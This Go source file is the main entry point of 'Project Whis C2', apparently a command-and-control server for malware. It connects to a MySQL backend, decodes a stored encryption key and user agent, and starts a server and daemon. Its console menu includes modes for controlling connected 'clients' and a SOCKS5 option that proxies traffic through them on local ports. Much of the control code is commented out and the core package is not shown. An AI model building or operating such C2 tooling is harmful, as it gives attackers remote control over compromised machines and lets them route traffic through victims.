package main

import (
	"ProjectWhis/C2/core"
	"bufio"
	"database/sql"
	"encoding/base64"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"log"
	"os"
	"os/signal"
	"time"
)

var (
	//	ServerStatus     bool = false
	//	FrontEndEndabled bool = true

	Banner string = `

⣿⣿⣿⣿⠟⣩⣴⣶⣦⣍⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⢏⣾⣿⣿⠿⣿⣿⣿⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠟⣩⣬⣭⠻⣿⣀⣿⣿⣿⢟⣤⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣷⣤⣒⠲⠶⢿⣘⣛⣻⠿⣿⣸⣿⣿⣷⣝⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⣦⢹⣿⣿⣿⣿⣷⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡿⢉⣴⣶⣦⠙⣿⣿⣿⣿⡼⣿⣿⣿⣿⣿⢿⣷⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣷⡘⠿⠟⣛⡁⢻⣿⣿⣿⣿⣝⢿⣿⠻⣿⢮⣭⣥⣄⡹⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣷⣦⣟⡶⠶⢾⣭⣽⣗⡈⠻⣿⣿⣿⣿⣿
⣿⣿⣷⡈⣿⣿⣿⣧⣌⠛⠿⣿⣿⣿⣿⣿⣿⣷⣷⡲⣶⣶⣾⣷⣌⡛⢿⣿⣿
⣿⣿⣿⠗⡈⠻⣿⣿⡿⢛⣶⣤⣍⠻⣿⣿⣿⣿⣿⡿⠆⠻⠿⣿⣿⡿⠗⣢⣿
⣿⣿⡏⢼⣿⣷⣶⢋⣴⣿⣿⣿⣿⡇⢀⣠⠄⣠⣶⣶⣿⣿⣷⣶⣶⣶⣿⣿⣿
⣿⣿⣷⣌⠛⠛⠛⠈⠛⠛⠛⠛⢛⠁⢈⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣇⡈⢉⣩⡭⠽⢛⣒⣒⣒⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣇⣉⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
`
)

func init() {
	go func() {
		c := make(chan os.Signal, 1)
		signal.Notify(c, os.Interrupt)
		<-c
		core.Log.Println("Program Killed by Owner.")
		os.Exit(1)
	}()

	core.NewLog("system.log")

}

func main() {
	core.LoadConfig()
	core.Log.Println("Connecting to SQL database...")
	core.DB, core.Err = sql.Open("mysql", core.MySQLUsername+":"+core.MySQLPassword+"@tcp("+core.MySQLHost+")/"+core.MySQLDatabase)
	if core.Err != nil {
		core.Log.Fatalln("[!] CHECK MYSQL SETTINGS IN 'config.toml' ! [!]")
	}
	defer core.DB.Close()

	core.Err = core.DB.Ping()
	if core.Err != nil {
		core.Log.Fatalln("[!] CHECK IF MYSQL SERVER IS ONLINE! [!]")
	}
	core.Log.Println("SQL Connection Good...")
	decodedKey, _ := base64.RawURLEncoding.DecodeString(core.GetSpecificSQL("settings", "Value", "Name", "EncryptionKey"))
	core.EncryptionPassword = string(decodedKey)
	decodedUA, _ := base64.RawURLEncoding.DecodeString(core.GetSpecificSQL("settings", "Value", "Name", "UserAgent"))
	core.UserAgent = string(decodedUA)
	core.Log.Println("Configuring Server")
	go core.GoServerWithFrontend()
	go core.Daemon()
	//	ServerStatus = true
	//	FrontEndEndabled = true

Menu:

	//	fmt.Println(Banner)
	fmt.Println("Project Whis C2 Console")
	//	fmt.Println("Server Status: " + strconv.FormatBool(ServerStatus))
	//	fmt.Println("Server Frontend: " + strconv.FormatBool(FrontEndEndabled))
	fmt.Println(" ")
	fmt.Print("-> ")
	CommandScan := bufio.NewScanner(os.Stdin)
	CommandScan.Scan()
	switch CommandScan.Text() {
	case "start":
		//		core.LoadConfig()
		//		core.Log.Println("Connecting to SQL database...")
		//		core.DB, core.Err = sql.Open("mysql", core.MySQLUsername+":"+core.MySQLPassword+"@tcp("+core.MySQLHost+")/"+core.MySQLDatabase)
		//		if core.Err != nil {
		//			core.Log.Fatalln("[!] CHECK MYSQL SETTINGS IN 'config.toml' ! [!]")
		//		}
		//		defer core.DB.Close()
		//
		//		core.Err = core.DB.Ping()
		//		if core.Err != nil {
		//			core.Log.Fatalln("[!] CHECK IF MYSQL SERVER IS ONLINE! [!]")
		//		}
		//		core.Log.Println("SQL Connection Good...")
		//		decodedKey, _ := base64.RawURLEncoding.DecodeString(core.GetSpecificSQL("settings", "Value", "Name", "EncryptionKey"))
		//		core.EncryptionPassword = string(decodedKey)
		//		decodedUA, _ := base64.RawURLEncoding.DecodeString(core.GetSpecificSQL("settings", "Value", "Name", "UserAgent"))
		//		core.UserAgent = string(decodedUA)
		//		core.Log.Println("Configuring Server")
		//		go core.GoServerWithFrontend()
		//		go core.Daemon()
		//		ServerStatus = true
		//		FrontEndEndabled = false

	case "startc":
		//		core.LoadConfig()
		//		core.Log.Println("Connecting to SQL database...")
		//		core.DB, core.Err = sql.Open("mysql", core.MySQLUsername+":"+core.MySQLPassword+"@tcp("+core.MySQLHost+")/"+core.MySQLDatabase)
		//		if core.Err != nil {
		//			core.Log.Fatalln("[!] CHECK MYSQL SETTINGS IN 'config.toml' ! [!]")
		//		}
		//		defer core.DB.Close()
		//
		//		core.Err = core.DB.Ping()
		//		if core.Err != nil {
		//			core.Log.Fatalln("[!] CHECK IF MYSQL SERVER IS ONLINE! [!]")
		//		}
		//		core.Log.Println("SQL Connection Good...")
		//		decodedKey, _ := base64.RawURLEncoding.DecodeString(core.GetSpecificSQL("settings", "Value", "Name", "EncryptionKey"))
		//		core.EncryptionPassword = string(decodedKey)
		//		decodedUA, _ := base64.RawURLEncoding.DecodeString(core.GetSpecificSQL("settings", "Value", "Name", "UserAgent"))
		//		core.UserAgent = string(decodedUA)
		//		core.Log.Println("Configuring Server")
		//		go core.GoServerNoFrontend()
		//		go core.Daemon()
		//		ServerStatus = true
		//		FrontEndEndabled = false
	case "control":
		//
		//		if ServerStatus == true && FrontEndEndabled == false {
		//			fmt.Println("Console C2 Mode")
		//			fmt.Println("|======================================================================|")
		//			fmt.Println("                  Active Clients = " + strconv.Itoa(core.ActiveClients))
		//			fmt.Println("                  Total Clients = " + strconv.Itoa(core.TotalClients))
		//			fmt.Println("|======================================================================|")
		//			fmt.Println(" ")
		//			fmt.Print("-> ")
		//			CommandScan := bufio.NewScanner(os.Stdin)
		//			CommandScan.Scan()
		//			switch CommandScan.Text() {
		//			case "help":
		//				fmt.Println("issue = Issue Command.")
		//				fmt.Println("help = Help Menu.")
		//				fmt.Println("exit = Exit Control.")
		//			case "exit":
		//				goto Menu
		//		default:
		//				fmt.Println("Unknown Command")
		//			}
		//		}
	case "help":
		//		fmt.Println("start = Start Standard server with User Frontend.")
		//		fmt.Println("startc = Start Console only server. No User Frontend.")
		//		fmt.Println("control = Allows you do control clients while in Console mode.")
		fmt.Println("help = Help Menu.")
		fmt.Println("exit = Exit Program.")
	case "socks5":
		fmt.Println("Enabling Socks5 Client...")
		fmt.Println("Listening on port: 8090")
		fmt.Println("Serving Socks5 at 127.0.0.1:6969")
		fmt.Println("")

		go core.ListenForSocks("8090")
		log.Fatal(core.ListenForClients("127.0.0.1:6969"))
	case "exit":
		fmt.Println("Closing C2 Server.")
		time.Sleep(5 * time.Second)
		os.Exit(1)
	default:
		fmt.Println("Unknown Command")
	}
	goto Menu
}
